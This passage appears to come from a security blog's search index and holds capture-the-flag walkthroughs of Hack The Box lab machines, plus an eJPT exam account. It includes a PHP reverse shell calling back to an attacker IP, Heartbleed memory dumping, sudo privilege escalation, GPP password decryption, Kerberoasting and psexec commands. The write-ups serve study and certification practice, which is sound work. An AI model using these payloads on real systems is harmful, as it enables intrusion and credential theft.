encrypted RSA private key (as we can see on line 2), I will not try to log in with ssh, because it will certainly ask for the private key’s password.XSS / PHP injectionI saw that we can inject html/javascript code in both /encode and /decode directories:So I tried to inject a tiny PHP reverse shell:After multiple attempts, I was pissed off so I ran another nmap scan.nmap scan (vuln)$ nmap -min-rate 5000 --max-retries 1 --script vuln -oN vuln-scan.txt 10.10.10.79The web server seems vulnerable to the Heartbleed vulnerability that affects OpenSSL. The Heartbleed bug allows anyone on the Internet to read the memory of the systems affected by the vulnerable versions of the OpenSSL software. This compromises the secret keys used to identify the service providers and to encrypt the traffic, the names and passwords of the users and the actual content. This allows attackers to eavesdrop on communications, steal data directly from the services and users and to impersonate services and users. [Source: heartbleed.com]We can confirm this by using sslyze:In order to exploit it, we can use this PoC script.When running the script we get an output with a lot of useless 00’s:$ python heartbleed.py defribulator v1.16A tool to test and exploit the TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)Usage: heartbleed.py server [options]Test and exploit TLS heartbeat vulnerability aka heartbleed (CVE-2014-0160)Options: -h, --help show this help message and exit -p PORT, --port=PORT TCP port to test (default: 443) -n NUM, --num=NUM Number of times to connect/loop (default: 1) -s, --starttls Issue STARTTLS command for SMTP/POP/IMAP/FTP/etc... -f FILEIN, --filein=FILEIN Specify input file, line delimited, IPs or hostnames or IP:port or hostname:port -v, --verbose Enable verbose output -x, --hexdump Enable hex output -r RAWOUTFILE, --rawoutfile=RAWOUTFILE Dump the raw memory contents to a file -a ASCIIOUTFILE, --asciioutfile=ASCIIOUTFILE Dump the ascii contents to a file -d, --donotdisplay Do not display returned data on screen -e, --extractkey Attempt to extract RSA Private Key, will exit when found. Choosing this enables -d, do not display returned data on screen.$ python heartbleed.py $TARGETChanging the line 116 allows us to reduce the payload size (0x40 to 0x10):We can run the script multiple times via the -n option. By doing so, we are able to read target’s memory’s content:$ echo -n aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg== | base64 -dheartbleedbelievethehypeheartbleedbelievethehype is probably the passphrase of the hype_key we found earlier. Let’s give it a try with hype as username (because of the filename) :User (hype)hype@Valentine:~/Desktop$ cat user.txt e6710a5464769fd5fcd216e076961750hype@Valentine:~/Desktop$ This time, we do not know the password of the user so we cannot use sudo to check if there is a way to perform a privilege escalation.Therefore, I will use linpeas.sh to perform enumeration on the system. The URL https://linpeas.sh/ exists :DThere are unexpected directories in / that we have access:The process below leads us to a privesc:hype@Valentine:/tmp$ tmux -S /.devs/dev_sessRootUseful links CyberChef CVE-2014-0160 Heartbleed Heartbleed exploit PoC" }, { "title": "HackTheBox - Nibbles", "url": "/htb-nibbles/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, nibbleblog, default credentials, CVE-2015-6967, metasploit, meterpreter, reverse-shell, sudo misconfiguration, writeup, oscp-prep", "date": "2020-12-24 05:37:00 +0700", "snippet": "FootholdI have a payment account at Hack the Box and I feel I should use it more than I do. When I’m not showing about their CTF style box, I like some challenges. The part that is that with the On box, I usually don’t write it. While I hone my skills in the hacking part, I don’t hone mine to document the process. when i post here i can miss a thing or two but i try to do it not documentation is as important as the actual system exploit process. something to know if you solve this problem more than your entertainment.With Nibbles, nothing is really new except for two things. First, I have to work on another content management system. Second, I learned something about hash cracking – but I’ll get to that in a moment.ReconnaissanceFirst thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.nmap scan (open ports)$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Nibbles-full-port-scan.txt 10.10.10.75Warning: 10.10.10.75 giving up on port because retransmission cap hit (1).Nmap scan report for 10.10.10.75Host is up (0.096s latency).Not shown: 65508 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).4418/tcp filtered axysbridgeApache/4.18 (port 80)By inspecting the sources on port 80, we see there is a hidden directory /nibbleblog/:Once we wo to his “hidden” directory we see that is qa website powered by Nibbleblog, which turns out to be an open source CMS for blogs:While I was navigating on the website, I encountered the following error:Maybe there is something to do with it, but let’s continue our enumeration.NibbleblogSince I’m looking for more information, I ran dirb on http://10.10.10.75/nibbleblog/:On http://10.10.10.75/nibbleblog/README, we get the version number (v4.0.3) of Nibbleblog:Bibbidi-Bobbidi-Boo…there is an exploit available!But it requires credentials so we have to go further:CredentialsI made a quick search → “nibbleblog default credentials”. Unfortunately, I didn’t find anything. \\Nevertheless, there is an admin’s page: http://10.10.10.75/nibbleblog/admin.php. We can try some basic username/password combinations like admin/admin, root/root or even nibbles/nibbles.admin/nibbles worked:MetasploitLet’s go back to the exploit:By doing so, we have a meterpreter. That’s nice, but in order to avoid this “black box” method, let’s exploit the vulnerability without this tool.CVE-2015-6967 exploitationThanks to https://packetstormsecurity.com/files/133425/NibbleBlog-4.0.3-Shell-Upload.html, we can follow the steps to perform the exploit: Prepare our PHP reverse shell:&amp;lt;?phpexec(&quot;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.7/1234 0&amp;gt;&amp;amp;1&#39;&quot;); Upload our malicious file to http://10.10.10.75/nibbleblog/admin.php?controller=plugins&amp;amp;action=config&amp;amp;plugin=my_image: Run a listener → nc -lnvp 1234 Visit http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php. Now we have a shell: User (nibbler)nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home&amp;lt;ml/nibbleblog/content/private/plugins/my_image$ cd /home nibbler@Nibbles:/home$ lslsnibblernibbler@Nibbles:/home$ cd nibblercd nibblernibbler@Nibbles:/home/nibbler$ ls -lals -latotal 20drwxr-xr-x 3 nibbler nibbler 4096 Dec 29 2017 .drwxr-xr-x 3 root root 4096 Dec 10 2017 ..-rw------- 1 nibbler nibbler 0 Dec 29 2017 .bash_historydrwxrwxr-x 2 nibbler nibbler 4096 Dec 10 2017 .nano-r-------- 1 nibbler nibbler 1855 Dec 10 2017 personal.zip-r-------- 1 nibbler nibbler 33 Dec 23 15:17 user.txtnibbler@Nibbles:/home/nibbler$ cat user.txtcat user.txte598bb90bc9ff2f87b72e2083c1cb95anibbler@Nibbles:/home/nibbler$Let’s see what we can run with sudo:$ sudo -l sudo: unable to resolve host Nibbles: Connection timed outMatching Defaults entries for nibbler on Nibbles: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser nibbler may run the following commands on Nibbles: (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.shRootOkay so we just have to replace /home/nibbler/personal/stuff/monitor.sh by malicious content:nibbler@Nibbles:/home/nibbler$ mkdir -p personal/stuffnibbler@Nibbles:/home/nibbler$ echo &quot;cat /root/root.txt&quot; &amp;gt; /home/nibbler/personal/stuff/monitor.shnibbler@Nibbles:/home/nibbler$ sudo /home/nibbler/personal/stuff/monitor.shsudo: unable to resolve host Nibbles: Connection timed outb59ce6c276598083872b41d4785c3e8Useful links CVE-2015-6967 Packetstorm NibbleBlog 4.0.3 Shell Upload" }, { "title": "HackTheBox - Shocker", "url": "/htb-shocker/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, dirb, cgi-bin, shellshock, CVE-2014-6271, metasploit, meterpreter, GTFOBins, writeup, oscp-prep", "date": "2020-12-23 19:32:00 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Shocker-full-port-scan.txt 10.10.10.56Nmap scan report for 10.10.10.56Host is up (0.099s latency).Not shown: 65532 closed portsPORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: Site doesn&#39;t have a title (text/html).2222/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)| 256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)|_ 256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)53649/tcp filtered unknownApache/2.4.18 (port 80)Seeing that there is a /cgi-bin directory, the webserver is probably vulnerable to Shellstock bash RCE. Shellshock bash remote code execution vulnerability: affects web servers utilizing CGI (Common Gateway Interface) → a system for generating dynamic web content. Directories such as /cgi-sys, /cgi-mod, /cgi-bin can be found.Adding -X .sh to dirb, we found a user.sh file:We can have a shell via metasploit:However, since I do this box to get ready for OSCP, I want to exploit this vuln manually. Via curl or from burp, I replace User-agent’s content by a reverse shell payload:First we’ve got the following error: /bin/bash: bash: Nu such file or directory.So I replace bash by /bin/bash and it worked:User (shelly)Flag:We can run perl with sudo:Let’s check GTFObins privesc:Rootshelly@Shocker:/home/shelly$ sudo /usr/bin/perl -e &#39;exec &quot;/bin/sh&quot;;&#39;sudo /usr/bin/perl -e &#39;exec &quot;/bin/sh&quot;;&#39;iduid=0(root) gid=0(root) groups=0(root)cd /rootcat root.txt 9be1ed1fbbe0c3319f9cc05dbcdb7941Useful links CVE-2014-6271 Exploit Shellshock on a Web Server Using Metasploit GTFObins" }, { "title": "HackTheBox - Mirai", "url": "/htb-mirai/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, mirai, pi-hole, raspberry, default credentials, file recovery, writeup, oscp-prep", "date": "2020-12-23 11:30:00 +0700", "snippet": " Mirai is one of the first significant botnets targeting exposed networking devices running Linux. Found in August 2016 by MalwareMustDie, its name means “future” in Japanese. Nowadays it targets a wide range of networked embedded devices such as IP cameras, home routers (many vendors involved), and other IoT devices. Since the source code was published on “Hack Forums” many variants of the Mirai family appeared, infecting mostly home networks all around the world. [Source: malpedia]“Mirai” is a big hint for this box because it’s the name of a botnet that scan the Internet for devices with default credentials.nmap scanAfter getting blank pages on http://10.10.10.48 and http://10.10.10.48:32469, I’ve decided to add the domain mirai.htb in my /etc/hosts file:Then, I ran dirb:Pi-hole (port 80)On http://mirai.htb/admin there is Pi-hole v3.1.4 running:Plex (port 32469)On http://mirai.htb:32469 there is Plex running:User (pi)We know Pi-hole is designed for Raspberry Pi. Default SSH credentials for Raspberry Pi’s are: username: pi password: raspberryIndeed:RootI thought it was like for the Blocky box user to root privesc, but I was wrong:Damn it !To retrieve the flag, there are many different options but my favorite one is:root@raspberrypi:/media/usbstick# grep -a &#39;[a-z0-9]\\{32\\}&#39; /dev/sdb |}*,.+-3d3e483143ff12ec505d026fa13e020broot@raspberrypi:/media/usbstick# Among the other options: strings, xxd, dcfldd, testdisk, photorec___Interesting links Malpedia - Mirai Mirai, le botnet d’objets connectés Malicious.life - Big Cannons" }, { "title": "HackTheBox - Blocky", "url": "/htb-blocky/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, minecraft server, wordpress, java, decompilation, jd-gui, sudo misconfiguration, writeup, oscp-prep", "date": "2020-12-22 06:17:00 +0700", "snippet": "FootholdNmap scan (open ports)$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Blocky-full-port-scan.txt 10.10.10.37Nmap scan report for 10.10.10.37Host is up (0.12s latency).Not shown: 65530 filtered portsPORT STATE SERVICE VERSION21/tcp open ftp ProFTPD 1.3.5a22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)| 256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)|_ 256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)80/tcp open http Apache httpd 2.4.18 ((Ubuntu))|_http-generator: WordPress 4.8|_http-server-header: Apache/2.4.18 (Ubuntu)|_http-title: BlockyCraft &amp;amp;#8211; Under Construction!8192/tcp closed sophos25565/tcp open minecraft Minecraft 1.11.2 (Protocol: 127, Message: A Minecraft Server, Users: 0/20)Apache httpd 2.4.18 (port 80)If we click on the first post on http://10.10.10.37/, we are redirected to a second page where we see a username (notch): Since it’s a wordpess site we could also query http://10.10.10.37/?author=1.With dirb we can discover some interesting directories:On http://10.10.10.37/plugins/ there are two .jar files:JAR stands for Java Archive Data. We can decompile these files with jd-gui:Is this a password?! Let’s try to log in to SSH with username notch and the password we just found 8YsqfCTnvxAUeduzjNSXe22Bingo, we have a shell!Usernotch@Blocky:~$ cat user.txt59fee0977fb60b8a0bc6e41e751f3cd5The first thing to check is: in which groups is the user I just owned?notch@Blocky:~$ iduid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)As we can see, he’s part of the sudo users. Let’s see what we can run with sudo:notch@Blocky:~$ sudo -l[sudo] password for notch: Matching Defaults entries for notch on Blocky: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser notch may run the following commands on Blocky: (ALL : ALL) ALLEverything! Are you serious notch?!Rootnotch@Blocky:~$ sudo suroot@Blocky:/home/notch# cd /rootroot@Blocky:~# lsroot.txtroot@Blocky:~# cat root.txt0a9694a5b4d272c694679f7860f1cd5fUseful links Reconnoitre wpscan jd-gui: a Java decompiler Best practices for hardening sudo?" }, { "title": "HackTheBox - Lame", "url": "/htb-lame/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, metasploit, ftp, samba, writeup, oscp-prep", "date": "2020-12-22 03:50:00 +0700", "snippet": "FootholdNmap scan (open ports)FTPWe can log in as anonymous:But there are no interesting files…Let’s check what we can enumerate on the other ports !SambaI couldn’t get anything from samba: Maybe we have to scan more ports, but before that we have to look for potential exploits that can help us with vsftpd 2.3.4Searchsploit + Metasploitvsftpd 2.3.4Bingo :Unfortunately:smbd 3.0.20By running a more complete nmap scan, we get smbd version:And this will lead us to root ↓Root" }, { "title": "eJPT Exam", "url": "/eJPT-Exam/", "categories": "blog, exam, elearnsecurity", "tags": "elearnsecurity, exam, certification", "date": "2020-12-21 12:00:00 +0700", "snippet": "So this year I have been trying to get into the pentesting/offensive side of security and trying to get my certifications going. Already having EC-Council C|ND (Certified Network Defender) and C|EH (Certified Ethical Hacker), I wanted to get some more &quot;practical&quot; certifications as the other two are more theory than anything else.My next certification goal is the OSCP (Offensive Security Certified Professional) but with the price tag of it at the moment I just cannot do it right now so i am now just focusing on the smaller certifications, like eLearnSecurity&#39;s eJPT and then finish the C|EH Mastery which requires the C|EH Practical. I have also been considering CompTIA Security+ and CompTIA PenTest+.So for the past month I have been contemplating doing eJPT first and have literally been procrastinating on purchasing it and waiting for the dollar to rand echange rate to come down as it&#39;s been pretty crazy the past few months.So on 16 Decemeber I purchased the eJPT exam. the courseware (called PTS, penetration testing student) is free through INE with the starter pass and I had a quick run through of it and seems very easy as I have already been dabbling in this sort of stuff for a while. I waited 2 days for any details on the exam but I didn&#39;t receive anything. I emailed support who quickly sent through the details for the exam.The exam voucher is valid for 6 months but there was no ways I could wait that long. I decided I was gonna wait 2 weeks before I do it. You have 3 days to complete the exam, answering 20 questions and you have to get 15 answers correct to pass. Sunday morning, 20 December, I decided, why wait two weeks when I can do it today. It should be easy enough! I spoke to a few people before who said that they did it in 3 - 10 hours which would be more than enough time.1:45pm I hit start and received my letter of engagement and VPN files to connect to the network.The letter of engagement is basically the letter which states the scope and what is required for the assessment, just like any other engagement from doing a real pentest.Without going into detail about the exam of course, it was a very enjoyable pentest. For me it was pretty straight forward, but so straight forward that I literally wondered why is this so easy which made me miss some vital information in the beginning which I wasted an hour or two on.What should have been a 2 hour pentest for me, turned into 6 hours. It was annoying because I was overthinking, but it was a great feeling being in that situation. I had to take a break at one point because I was pretty overwhelmed by the amount of windows, shells, tabs and everything I had open. I went for a 35 minute run, had something to eat and then carried on with the last 2 questions that remained unanswered.At hour 3 I already knew I had the 15 points required, but really wanted 20, so I spent quite a bit overthinking the simplest of things.Once I decided enough was enough I clicked submit and was welcomed with![desktop](/assets/img/sample/eJPTcongrats.png)I got 18/20 and I am not even sure which 2 questions I had wrong, they don&#39;t tell you! I really want to know!This is definitley a good exam to start as a stepping stone into the offensive side. eLearnSecurity has some awesome paths to the various branches and I hope to someday continue those paths but right now, the price tag on the yearly subscription is too much for my pocket sadly, even with the 30% discount they offer on a regular basis.Lessons learned:DON&#39;T OVERTHINK! I did so many times and I spent too much time overthinking the smallest of things.TAKE NOTES! Jot down WHERE you get your information from. I lost out on a point because I had information about something but could not remember where I got it from so I just thought I made a typo.TEST EVERYTHING! Just because you think something is too easy and you think, surely they won&#39;t do that, TEST IT!TAKE A BREAK! At one point I was overwhelmed. Too many windows, terminals, tabs, etc. I walked away from my PC and went for a 35 minute run. Came back refreshed.Just some tools that I used:fpingnmapgobusterhydrasmbclientenum4linuxnessuszapmsfconsolesqlmapjohn" }, { "title": "HackTheBox - Active", "url": "/htb-active/", "categories": "Hackthebox walkthroughs, Windows, Easy", "tags": "Active Directory, rpcclient, ldapsearch, SMB, smbclient, Groups.xml, GPP, Group Policy Preferences, gpp-decrypt, kerbrute, Kerberos, Kerberoasting, impacket, GetUserSPNs.py, psexec.py, htb-windows-easy, writeup, oscp-prep", "date": "2020-12-21 06:00:00 +0700", "snippet": "Active is a great and very realistic box, It’s a bit easy if you are familiar with windows active directory. But if you don’t… then this box will ask you something. This is a windows box so let’s jump right in.Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Active-full-port-scan.txt 10.10.10.100Warning: 10.10.10.100 giving up on port because retransmission cap hit (1).Nmap scan report for active.htb (10.10.10.100)Host is up (0.100s latency).Not shown: 63856 closed ports, 1656 filtered portsPORT STATE SERVICE VERSION53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)| dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39)88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-09-08 12:05:22Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)445/tcp open microsoft-ds?464/tcp open tcpwrapped593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open tcpwrapped3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)3269/tcp open tcpwrapped5722/tcp open msrpc Microsoft Windows RPC9389/tcp open mc-nmf .NET Message Framing47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49152/tcp open msrpc Microsoft Windows RPC49153/tcp open msrpc Microsoft Windows RPC49154/tcp open msrpc Microsoft Windows RPC49155/tcp open msrpc Microsoft Windows RPC49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.049158/tcp open msrpc Microsoft Windows RPC49169/tcp open msrpc Microsoft Windows RPC49171/tcp open msrpc Microsoft Windows RPC49182/tcp open msrpc Microsoft Windows RPCService Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windowsHost script results:|_clock-skew: 3m22s| smb2-security-mode: | 2.02: |_ Message signing enabled and required| smb2-time: | date: 2021-09-08T12:06:21|_ start_date: 2021-09-08T11:22:59RPC (port 135)root@kali:~/htb/machines/Windows/Active# rpcclient -U &#39;%&#39; 10.10.10.100rpcclient $&amp;gt; srvinfo 10.10.10.100 Wk Sv PDC Tim NT Domain Controller platform_id : 500 os version : 6.1 server type : 0x80102brpcclient $&amp;gt; enumdomusersCould not initialise samr. Error was NT_STATUS_ACCESS_DENIEDrpcclient $&amp;gt; getdompwinfoCould not initialise samr. Error was NT_STATUS_ACCESS_DENIEDrpcclient $&amp;gt; querydispinfoCould not initialise samr. Error was NT_STATUS_ACCESS_DENIEDrpcclient $&amp;gt;LDAP (port 389)$ ldapsearch -h 10.10.10.100 -x -s base namingcontexts# extended LDIF## LDAPv3# base &amp;lt;&amp;gt; (default) with scope baseObject# filter: (objectclass=*)# requesting: namingcontexts ##dn:namingContexts: DC=active,DC=htbnamingContexts: CN=Configuration,DC=active,DC=htbnamingContexts: CN=Schema,CN=Configuration,DC=active,DC=htbnamingContexts: DC=DomainDnsZones,DC=active,DC=htbnamingContexts: DC=ForestDnsZones,DC=active,DC=htb# search resultsearch: 2result: 0 Success# numResponses: 2# numEntries: 1$ echo &quot;$TARGET active.htb&quot; &amp;gt;&amp;gt; /etc/hostsSMB (Port 445)$ smbclient -L //$TARGET/ -U &#39;%&#39; Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Replication Disk SYSVOL Disk Logon server share Users Disk SMB1 disabled -- no workgroup availableThe only shared folder which we access to is Replication. Note: We could have mounted it with the following command: mount -t cifs /10.10.10.100/Replication /mnt/Replication -o username=&amp;lt;username&amp;gt;,password=&amp;lt;password&amp;gt;,domain=active.htbAfter inspecting the whole content, we can find a Groups.xml file.Group Policy Preferences (GPP) was introduced in Windows Server 2008. Among many other features, it allowed administrators to modify users and groups across their network.The defined password was AES-256 encrypted and stored in this Groups.xml file.$ smbclient //$TARGET/Replication/ -U &#39;%&#39;Try &quot;help&quot; to get a list of possible commands.smb: \\&amp;gt; ls . D 0 Sat Jul 21 12:37:44 2018 .. D 0 Sat Jul 21 12:37:44 2018 active.htb D 0 Sat Jul 21 12:37:44 2018 10459647 blocks of size 4096. 5728641 blocks available...smb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\&amp;gt; ls . D 0 Sat Jul 21 12:37:44 2018 .. D 0 Sat Jul 21 12:37:44 2018 Groups.xml A 533 Wed Jul 18 22:46:06 2018 10459647 blocks of size 4096. 5728499 blocks availablesmb: \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\&amp;gt; get Groups.xmlgetting file \\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml of size 533 as Groups.xml (0.6 KiloBytes/sec) (average 2.3 KiloBytes/sec)This file indicates that a user called SVC_TGS exists and we have also its encrypted password (cpassword).$ cat Groups.xml &amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&amp;lt;Groups clsid=&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&amp;gt;&amp;lt;User clsid=&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot; name=&quot;active.htb\\SVC_TGS&quot; image=&quot;2&quot; changed=&quot;2018-07-18 20:46:06&quot; uid=&quot;{EF57DA28-5F69-4530-A59E-AAB58578219D}&quot;&amp;gt;&amp;lt;Properties action=&quot;U&quot; newName=&quot;&quot; fullName=&quot;&quot; description=&quot;&quot; cpassword=&quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot; changeLogon=&quot;0&quot; noChange=&quot;1&quot; neverExpires=&quot;1&quot; acctDisabled=&quot;0&quot; userName=&quot;active.htb\\SVC_TGS&quot;/&amp;gt;&amp;lt;/User&amp;gt;&amp;lt;/Groups&amp;gt;In 2012, Microsoft published the AES key on MSDN, meaning that passwords set using GPP are now trivial to crack and considered low hanging fruits.We can decrypt this password using gpp-decrypt:$ gpp-decrypt &quot;edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ&quot;GPPstillStandingStrong2k18SVC_TGS’s password is GPPstillStandingStrong2k18.We can use it to access more SMB shared folders:Kerberos (port 88)First, we can confirm that this user exists on the domain:$ ./kerbrute userenum --dc active.htb -d active.htb User.txtFootholdKerberoastingAccording to MITRE ATT&amp;amp;CK - Steal or Forge Kerberos Tickets: Kerberoasting: “Service principal names (SPNs) are used to uniquely identify each instance of a Windows service. To enable authentication, Kerberos requires that SPNs be associated with at least one service logon account (an account specifically tasked with running a service).”An attacker may abuse a valid Kerberos ticket-granting ticket (TGT) (or sniff network traffic) to obtain a ticket-granting service (TGS) ticket.The Kerberoasting attack consists in extracting a hash of the encrypted material from a Kerberos Ticket Granting Service reply (TGS_REP).This hash is the password hash of the account in whose context the service instance is running.Obviously, it can be subjected to offline cracking in order to retrieve the plaintext password of the account.Now that we assume that we know SVC_TGS’s password we can perform a Kerberoasting attack using impacket’s script GetUserSPNs.py.$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip $TARGET -request/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in a future release.Impacket v0.9.22 - Copyright 2020 SecureAuth CorporationServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation -------------------- ------------- -------------------------------------------------------- -------------------------- -------------------------- ----------active/CIFS:445 Administrator CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb 2018-07-18 21:06:40.351723 2021-01-21 17:07:03.723783 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$16a24811f8ba1df0a56c39fa8da458ce$f1b56d38da31eaaabcab52f3a8b736407fc9ccff5afb1299c04d4e75dc97fe04359b3dfa74b1c368c6ce60be284a53e0e0ca9c87bf80dde35a5052224ca4946efe8bab33b627276782b9cde15d3d192b4822b73ae18948236bac0eb15e710ba95e9f320994854e4a14c38fb6cec4bd2186a1d309b42cb1cc6fe0cd3bff4eecccb53de5b1fba8e2acd6bf6d81076a5804cb7fc6dedab21cc5981facd73fd7411c2823a6a953cae330d6c3349f3322fda528cb3d1c66f263ba8883e68bab1f9cac60a015956f86bc8fa25a3c1541b844fd2799d90f1c391824770856ebdd578cad7884486fbc1a783c3718f95ab3504fbee6036a710666c565e5227ebcb68775e524ca9547f7c4056a91a83b017f25464a8e14f75acac4ed7ce380883c35ab864ece280b627c0326a0b8b715e518fe608ede5340fb5abcbe9b41fb5e050006fcb2b07caa5c99b22847d59e77873f7773c2df0243160acdc6629843b57a3e89c49a5343e94d4803f02d960a78bc08a67d0e3c044ad9c959a669a96c630d9e3109a1ab7ac16579bf5dd9614ab22f7edabdc89d6c6982cc13b4b4f2efb071f372278785213084c5b6fa4a5699b85c25a16500707ec2d3ddb32cb68372f609a9c3b41160122991bec40bcbbdc7da5faabc2b0973c521f9b230d5f88aee9dfe4008dbc7954a47828a79c84e6c3b13cd827206fcbcc00233f71d0225f113c2efd5ebbaf004b25e86948e991c56f0253c2427f712ef9b25691ac1ac5c66479f83d8ad1a0584c84bd0202ecb026837c227d05662fe38c697d6253c5ac76b7dea7fdbd01181a6f9648245d473f1b6597b065243f74ab86b03033e5fe9fc8b75446a5118ffcbc6e597540fdd3902076f6ef19d9726be148891cc680de89ad62cb7c153b03ef0df36ce6325efa26e4ead466cbb0063c19f043a67775ff84b97034ce31ff6e1b95e1657814408282bb8df928dee271d374f35e02c33fbabf6d5cae02e1c25985987779fb1b06fde64d2ebaa0425c1ac974672b28b1bc93a85d0430aefb070208f864cae8ddb411720f841d8620fdc532389205ce29de641c129cec0dabab923e63c050aefebc01dcbe9cf32e66640bce471b0155e626f78774eb75ae4bfc3b87c129dfaba3084d10522ae51c97e698a1fabb982d9cf54b112594a0836ceaf704d8a2f24ad24923bc159666b9d2464001a3ec08969ea34de414c54c32af9e53627d6483e20a8db197db764c83d24ba78d291e8063a44dc0c7ba3d1Yes! We dumped the Administrator’s password hash. We can try to crack it using hashcat or john:$ hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt...Ticketmaster1968...$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt ...Ticketmaster1968...Gaining accessImpacket’s psexec.py can be used to get a shell as Administrator, and gain root.txt:$ psexec.py active.htb/Administrator:Ticketmaster1968@$TARGETImpacket v0.9.22 - Copyright 2020 SecureAuth Corporation[*] Requesting shares on 10.10.10.100.....[*] Found writable share ADMIN$[*] Uploading file JyqnDLAw.exe[*] Opening SVCManager on 10.10.10.100.....[*] Creating service MQiP on 10.10.10.100.....[*] Starting service MQiP.....[!] Press help for extra shell commandsMicrosoft Windows [Version 6.1.7601]Copyright (c) 2009 Microsoft Corporation. All rights reserved.C:\\Windows\\system32&amp;gt;whoamint authority\\systemUseful links Using Group Policy Preferences for Password Management = Bad Idea MSDN - AES key Detecting Kerberoasting Activity " }, { "title": "Fortigate IPSEC Tunnel Troubleshoot", "url": "/Fortigate-IPSEC-Troubleshooting/", "categories": "blog, fortigate", "tags": "fortigate, fortinet, firewall", "date": "2020-12-11 12:00:00 +0700", "snippet": "I have 